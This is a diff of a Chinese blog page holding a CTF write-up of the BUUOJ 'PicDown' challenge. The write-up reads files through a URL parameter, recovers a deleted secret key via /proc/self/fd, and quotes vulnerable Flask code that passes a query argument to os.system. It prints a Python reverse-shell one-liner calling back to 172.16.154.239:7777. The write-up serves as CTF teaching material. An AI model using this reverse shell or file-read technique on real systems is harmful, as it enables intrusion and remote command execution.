@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      643 字
+      681 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      17
+      9
        分钟
     </span>
   
@@ -245,6 +238,12 @@
             <!-- SEO header -->
             <h1 style="display: none">PicDown</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h2><p><img src="https://ae03.alicdn.com/kf/Uce6df5309dde4da49889e468a001b3c4b.jpg" srcset="/img/loading.gif" alt="01.png">      </p>
 <p>随便输，url变成了<code>http://7a97406b-5c95-46e4-be43-8311778ca05e.node3.buuoj.cn/?url=127.0.0.1</code><br>看到url，以为是ssrf,试了几下，感觉不是，看了wp       </p>
@@ -259,58 +258,58 @@
 <p><code>/proc/self 表示当前进程目录</code>    </p>
 <p>回到题上，看一下当前进程的命令<code>url=/proc/self/cmdline</code><br><img src="https://ae03.alicdn.com/kf/U96555e477ec64b21977950e508bfc592L.jpg" srcset="/img/loading.gif" alt="06.png">       </p>
 <p>读一下<code>app.py</code>       </p>
-<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
-<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
-<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> urllib
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> urllib
 
-app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app = Flask(__name__)
 
-SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
-f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
-SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
-os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
-
-
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>
+SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span>
+f = <span class="hljs-built_in">open</span>(SECRET_FILE)
+SECRET_KEY = f.read().strip()
+os.remove(SECRET_FILE)
 
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
-            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
-            <span class="token keyword">return</span> response
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>
-    <span class="token keyword">except</span><span class="token punctuation">:</span>
-        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>
-    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>
+<span class="hljs-meta">@app.route(&#x27;/&#x27;)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)
 
 
-<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
-        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>
-        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
-        res <span class="token operator">=</span> <span class="token string">"ok"</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>
+<span class="hljs-meta">@app.route(&#x27;/page&#x27;)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span>
+    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):
+            res = urllib.urlopen(url)
+            value = res.read()
+            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)
+            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span>
+            <span class="hljs-keyword">return</span> response
+        <span class="hljs-keyword">else</span>:
+            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span>
+    <span class="hljs-keyword">except</span>:
+        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)
 
-    <span class="token keyword">return</span> res
+
+<span class="hljs-meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span>
+    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)
+    print(SECRET_KEY)
+    <span class="hljs-keyword">if</span> key == SECRET_KEY:
+        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)
+        os.system(shell)
+        res = <span class="hljs-string">&quot;ok&quot;</span>
+    <span class="hljs-keyword">else</span>:
+        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span>
+
+    <span class="hljs-keyword">return</span> res
 
 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre></code></pre>
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre></div></code></pre>
 <p>在<code>/no_one_know_the_manager</code>路由下<br>get到的key==SECRET_KEY就能执行命令了         </p>
 <p>得到SECRET_KEY       </p>
 <p><code>/proc/self/fd</code><br>fd这个目录里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。       </p>
@@ -318,8 +317,8 @@ os<span class="token punctuation">.</span>remove<span class="token punctuation">
 <p>所以读取<code>/proc/self/fd/1</code><br>对1爆破，当为3时，长度不一样<br><img src="https://ae02.alicdn.com/kf/Ub2f3a30c5fcd4cc69104781da2a8dc3ey.jpg" srcset="/img/loading.gif" alt="07.png">        </p>
 <p>需要将SECRET_KEY url编码一下<br><img src="https://ae02.alicdn.com/kf/U77030cdb74d544d190193eb79ca4157aN.jpg" srcset="/img/loading.gif" alt="08.png">       </p>
 <p>因为system没有回显，所以需要反弹shell       </p>
-<pre><code>python -c &quot;import
-os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre>
+<div class="hljs"><pre><code>python -c &quot;import
+os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre></div>
 <p>python反弹shell，同样url编码       </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/114594402?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">MORE</a></p>
 
@@ -440,7 +439,7 @@ os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -466,8 +465,6 @@ os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 
 
 
-  
-    
   
 
 
